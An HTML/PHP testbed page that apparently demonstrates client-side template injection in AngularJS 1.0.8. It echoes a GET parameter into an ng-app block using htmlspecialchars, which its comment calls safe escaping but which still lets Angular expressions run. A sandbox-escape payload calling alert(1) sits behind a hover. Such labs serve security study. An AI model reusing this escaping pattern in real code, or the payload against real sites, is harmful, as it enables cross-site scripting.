<html>
    <head> 
        <meta charset="utf-8">
        <title>1.0.8 AngularJS Sandbox Demo</title>
        <script src="angular1.0.8.js"></script>
        <style>
        .showme, .showhim:hover .ok{ display: none; }
        .showhim:hover .showme{ display : block; }
        </style>
    </head>
    <body>
        <h3>Testbed for Angular JS version 1.0.8</h3>
        <form action="angular1.0.8.php">
            <input type="text" size="70" name="q" value="hello world">
            <input type="submit" value="go">
        </form>
        <div class="showhim">
           <div class="showme"><input type="text" size=70 value="{{constructor.constructor('alert(1)')()}}"></div>
           <div class="ok"><i>hidden 1.0.8</i></div>
        </div>
        <hr/>
            <b>Angular JS Expression:</b>
            <!-- start of AngularJS app -->
            <div ng-app>
<?php
    // GET parameter ?q= mit sicherem escaping
    $q = $_GET['q'];
    echo htmlspecialchars($q,ENT_QUOTES);
?>


hello world

            </div>
            <!-- end of AngularJS app -->
        <hr/>
        <div style="margin-top: 150px">
	</div>
    </body>
</html>
